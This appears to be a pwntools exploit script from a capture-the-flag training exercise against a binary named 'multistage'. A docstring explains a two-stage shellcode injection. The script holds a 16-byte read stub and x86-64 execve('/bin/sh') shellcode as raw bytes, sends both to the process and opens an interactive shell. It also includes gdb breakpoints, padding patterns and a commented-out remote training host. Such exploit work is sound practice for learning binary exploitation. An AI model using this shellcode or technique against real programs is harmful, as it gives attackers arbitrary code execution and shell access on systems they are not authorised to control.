from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

r = process("./multistage") 

'''
Inject a shellcode and get read the flag. The read is limited to 20 bytes.

Solution
The binary executes an arbitrary input code which has the maximum size of 20 bytes. This imply that is not possible to spawn directly a shell. We can do multistage injection:

First stage: 20 bytes are enough for a read. If we position the char *buf pointer after the read assembly injection, we then in the second stage input the shellcode, which will be executed immidiatly after the injection read is completed.

mov rsi, rax
add rsi, 0x11
xor rax, rax
xor rdi, rdi
mov dl, 0xff
xor rax,rax
syscall
Second stage: when the injected read is performed we input the shellcode, which will be written starting from the 17th byte of the buffer (since the first stage code is 16 byte long).

jmp binsh
back:
xor rax, rax
mov al, 0x3b
pop rdi
xor rsi, rsi
xor rdx,rdx
syscall

binsh:
call back
nop
nop
'''
#r = remote("bin.training.jinblack.it", 2003)

# jmp binsh
# beforethemove:
# mov rax, 0x3b
# pop rdi
# mov rsi, 0
# mov rdx, 0
# syscall
# binsh:
# call beforethemove
# nop
# nop
# nop

gdb.attach(r, """
	b *(get_name + 43)
	b *(main + 120)
""")

#mov rdx, cs
#mov rdi, rbx
#add rax, 0xd
#mov rsi, rax 
#mov rax, rcx
#syscall

reading = b"\x8C\xCA\x48\x89\xDF\x48\x83\xC0\x11\x48\x89\xC6\x48\x89\xC8\x0F\x05"

shellcode = b"\xEB\x18\x48\xC7\xC0\x3B\x00\x00\x00\x5F\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC2\x00\x00\x00\x00\x0F\x05\xE8\xE3\xFF\xFF\xFF/bin/sh\x00"
#shellcode = b"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaalzaambaamcaamdaameaamfaamgaamhaamiaamjaamkaamlaammaamnaamoaampaamqaamraamsaamtaamuaamvaamwaamxaamyaamzaanbaancaandaaneaanfaangaanhaaniaanjaankaanlaanmaannaanoaanpaanqaanraansaantaanuaanvaanwaanxaanyaanzaaobaaocaaodaaoeaaofaaogaaohaaoiaaojaaokaaolaaomaaonaaooaaopaaoqaaoraaosaaotaaouaaovaaowaaoxaaoyaaozaapbaapcaapdaapeaapfaapgaaphaapiaapjaapkaaplaapmaapnaapoaappaapqaapraapsaaptaapuaapvaapwaapxaapyaapzaaqbaaqcaaqdaaqeaaqfaaqgaaqhaaqiaaqjaaqkaaqlaaqmaaqnaaqoaaqpaaqqaaqraaqsaaqtaaquaaqvaaqwaaqxaaqyaaqzaarbaarcaardaareaarfaargaarhaariaarjaarkaarlaarmaarnaaroaarpaarqaarraarsaartaaruaarvaarwaarxaaryaarzaasbaascaasdaaseaasfaasgaashaasiaasjaaskaaslaasmaasnaasoaaspaasqaasraassaastaasuaasvaaswaasxaasyaaszaatbaatcaatdaateaatfaatgaathaatiaatjaatkaatlaatmaatnaatoaatpaatqaatraatsaattaatuaatvaatwaatxaatyaat"
#shellcode = b"A" * 1016 + b"BBBBBBBB"
#shellcode = b"\x0F\x05"
#shellcode = shellcode.ljust(1016, b"A") + p64(0x601080) 
#print(shellcode)
#shellcode = b"A" * 20 + b"B" * 20 + b"C" * 20
print("lunghezza in bytes dello reading: "+ str(len(reading)))
print("lunghezza in bytes dello shellcode: "+ str(len(shellcode)))

r.send(reading)
r.send(shellcode)

r.interactive()
input("wait")
